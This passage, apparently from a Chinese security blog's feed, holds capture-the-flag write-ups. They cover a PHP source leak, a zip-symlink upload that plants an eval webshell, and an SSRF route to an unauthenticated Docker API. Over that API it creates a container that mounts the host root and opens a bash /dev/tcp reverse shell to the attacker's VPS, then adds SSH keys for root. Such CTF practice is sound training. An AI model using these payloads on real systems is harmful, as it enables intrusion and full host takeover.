<p><img src="/posts/3478ea8e/1753672208550-f3bce11a-e8d6-4a0c-98bb-262aee7ed9fc.png" alt="img"></p>
<p>得到flag</p>
<h2 id="压压压"><a href="#压压压" class="headerlink" title="压压压"></a>压压压</h2><p> 第一个点是&lt;&#x3D;7.4.21的php -S开启的服务它有⼀个信息泄露的漏洞  </p>
<p><a href="https://www.cnblogs.com/Kawakaze777/p/17799235.html">https://www.cnblogs.com/Kawakaze777/p/17799235.html</a></p>
<p><img src="/posts/3478ea8e/1753672479801-80c1205b-d124-4b86-b800-46ed8fcfb312.png" alt="img"></p>
<p>空格是必要的，读出源码，开始审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;) //判断MIME是否为application/zip</span><br><span class="line">&#123;</span><br><span class="line">    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); //进入tmp文件夹，然后解压缩，这样我们上传的一句话木马就不能执行了。</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>so，我们需要绕过这个点就需要使用软连接，</p>
<p>然链接：可以让两不同个文件夹访问同一个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/html poc 创建一个软连接的文件</span><br><span class="line">zip --symlinks 1.zip poc 对其进行压缩</span><br><span class="line">mkdir link</span><br><span class="line">cd link</span><br><span class="line">echo &quot;&lt;?php eval($_POST[1]);?&gt;&quot; &gt; shell.php</span><br><span class="line">zip -r poc.zip link 创建一句话木马并且压缩。</span><br></pre></td></tr></table></figure>

<p><img src="/posts/3478ea8e/1753672910977-cae7161c-9343-4b86-8128-f08d7890477d.png" alt="img"></p>
<h2 id="快逃"><a href="#快逃" class="headerlink" title="快逃"></a>快逃</h2><p><img src="/posts/3478ea8e/1753673051122-f7c9cdd9-d6e9-4caf-9dc5-e48bd7e4af0e.png" alt="img"></p>
<p>有一个ssrf漏洞，尝试探一下端口</p>
<p><img src="/posts/3478ea8e/1753673314881-3810895f-60da-40f6-ac31-e81ca346e2cc.png" alt="img"></p>
<p><img src="/posts/3478ea8e/1753673614459-a8e430c4-3565-4eb1-b335-6fd158acc722.png" alt="img"></p>
<p>可以看到是8080 80 ，2375端口存活</p>
<p>还有22端口也存活</p>
<p>2375端口比较特殊， Dockerapi未授权默认端⼝</p>
<p>方法：</p>
<p> 利⽤dockerapi未授权+curl发包去创建一个特权容器，并将靶机的根目录挂载到这个容器中，以此控制靶机的文件系统</p>
<p>1.创建bash镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;http://127.0.0.1:2375/images/create?fromImage=bash&amp;tag=latest&quot;</span><br></pre></td></tr></table></figure>

<p>注意是post方法</p>
<p><img src="/posts/3478ea8e/1753677022365-e385dd7e-c387-4883-9177-e28fd7b35e48.png" alt="img"></p>
<p>2.创建容器，挂载靶机根目录，并且将容器反弹到你的vps上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;http://127.0.0.1:2375/containers/create&quot; \</span><br><span class="line">-H &quot;Content-Type: application/json&quot; \</span><br><span class="line">-d &#x27;&#123;</span><br><span class="line"> &quot;Image&quot;: &quot;bash&quot;,  //利用刚才创造的镜像</span><br><span class="line"> &quot;Cmd&quot;: [</span><br><span class="line"> &quot;bash&quot;, &quot;-c&quot;, </span><br><span class="line">&quot;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;</span><br><span class="line"> ], //反弹shell</span><br><span class="line"> &quot;HostConfig&quot;: &#123;</span><br><span class="line"> &quot;Binds&quot;: [&quot;/:/tmp/docker&quot;]  //将宿主机的根目录 / 挂载到容器的 /tmp/docker 目录。</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>风险</strong>：容器内可直接修改宿主机文件系统（提权或破坏）这也是我们需要的。</p>
<p><img src="/posts/3478ea8e/1753676006844-2f2efe7b-017e-4e36-aae8-811514d43376.png" alt="img"></p>
<p>3.启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;http://127.0.0.1:2375/containers/&lt;容器ID&gt;/start&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/3478ea8e/1753690591499-5e53c641-760f-419d-89b9-c222a081c0cf.png" alt="img"></p>
<p>弹到shell，</p>
<p><img src="/posts/3478ea8e/1753690640452-ef653e80-fc0a-4afa-96d8-169bd7de38bf.png" alt="img"></p>
<p>挂载到根目录获得主机的管理权限</p>
<p>我们可以通过ssh写入公钥登录</p>
<p>新建一个私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;hacker@target&quot;</span><br><span class="line">cat ~/.ssh/id_rsa.pub //公钥</span><br></pre></td></tr></table></figure>

<p>然后将输出的公钥写入root下的 .ssh&#x2F;authorized_keys  中</p>
<p><img src="/posts/3478ea8e/1753691380281-5a4359f4-ad19-4f12-a9e0-11581469403f.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa  root@139.9.209.209 -p 10079</span><br></pre></td></tr></table></figure>

<p>连接靶机，</p>
<p><img src="/posts/3478ea8e/1753691587685-9f30664b-5fa5-453a-bec1-603b1102916a.png" alt="img"></p>
<p>flag在相关进程中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>

<p><img src="/posts/3478ea8e/1753691720066-64dc2dd7-ccff-4899-a10b-fd843b17707f.png" alt="img"></p>
<p> 看看上⾯的tmux的flagseesion  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux capture-pane -t flag_session -p</span><br></pre></td></tr></table></figure>

<p><img src="/posts/3478ea8e/1753691857217-ec16c6d4-969c-4f40-b47b-e14dcffe9273.png" alt="img"></p>
<p><img src="/posts/3478ea8e/1753691885643-82d01904-8f4c-489d-8022-1a37adb95111.png" alt="img"></p>
<p>解决</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>轩辕杯复现wp</title>
    <url>/posts/1f12189c/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p><img src="/posts/1f12189c/1747826527098-6dd4011f-6a4c-4aac-b739-94eaa47617a0.png" alt="img"></p>
<p>焚经一把梭了，直接打开无回显，写进1.txt看的</p>
<h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p><img src="/posts/1f12189c/1747826739781-558c00a9-6ef6-4179-b374-f8c8b99cbc9e.png" alt="img"></p>
<p>信息泄露</p>
<p><img src="/posts/1f12189c/1747826766765-219ca436-ff48-4e45-a885-3fab70fa0ade.png" alt="img"></p>
<p>flag</p>
<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p><img src="/posts/1f12189c/1747829679830-074e7f9e-8685-4eba-b651-d0a1f3b8c2ed.png" alt="img"></p>
<p>文件读取flag</p>
<h2 id="ezssrf"><a href="#ezssrf" class="headerlink" title="ezssrf"></a>ezssrf</h2><p><img src="/posts/1f12189c/1747836563220-7286b65e-0a59-477b-8fec-6dd112b93261.png" alt="img"></p>
<p>访问flag</p>
<p><img src="/posts/1f12189c/1747836678380-4bedc252-b9f1-47cf-9f55-c191ce74f983.png" alt="img"></p>
<h2 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h2><p><img src="/posts/1f12189c/1747883868889-69728c4a-3105-4ea2-bd83-fc7ac5ffd5ee.png" alt="img"></p>
<p>文件读取源码</p>
<p>找key伪造cookie</p>
<p><img src="/posts/1f12189c/1747884237992-7d0c1db5-f9d3-4022-a630-6d80d162bf03.png" alt="img"></p>
<p>密钥来自环境变量</p>
<p>看看</p>
<p><img src="/posts/1f12189c/1747884331564-82ea2f9d-1a72-4c27-9f33-df0d3c6f50db.png" alt="img"></p>
<p>有个非预期</p>
<p><img src="/posts/1f12189c/1747884403522-5d8fbfe4-a358-478c-97ff-aeba785e16b3.png" alt="img"></p>
<p>密钥在这th1s_1s_k3y</p>
<p><img src="/posts/1f12189c/1747888996222-1f096d79-bf7d-43b4-9962-e229e3401654.png" alt="img"></p>
<p>伪造成功</p>
<p>这样就可以上传文件了</p>
<p>上传文件我们需要利用reading.html，进行模板渲染，然后打ssti，但是文件会被删除，那么有文件删除，文件上传，文件读取，那我们就可以打条件竞争，多上传，让它在删除之前被我们读取到</p>
<p><img src="/posts/1f12189c/1748173131447-96b44bae-2889-426c-9824-0582448344ff.png" alt="img"></p>
<p>得到flag</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/posts/1f12189c/1747882249349-ceb93aa1-30a0-4e7b-943d-0a23ce32f570.png" alt="img"></p>
<p>用head方法提交，到这关很新颖，身份验证ua头</p>
<p><img src="/posts/1f12189c/1747882952810-30df4caf-7788-4150-bb8d-7d14d0c28acd.png" alt="img"></p>
<p>中间的过程就不展示了</p>
<h2 id="ezsql1-0"><a href="#ezsql1-0" class="headerlink" title="ezsql1.0"></a>ezsql1.0</h2><p><img src="/posts/1f12189c/1747880946391-2dc00694-36f4-4913-9dd8-33013675d407.png" alt="img"></p>
<p>ctf库下的flag表里的是假flag</p>
<p><img src="/posts/1f12189c/1747881344736-aeb8d711-9b1c-40ac-b779-eadcb26948bb.png" alt="img"></p>
<p>只能在去找别的库</p>
<p><img src="/posts/1f12189c/1747881390113-eb2bfd82-9e36-4dc5-ade2-8acc287e6f73.png" alt="img"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
</search>
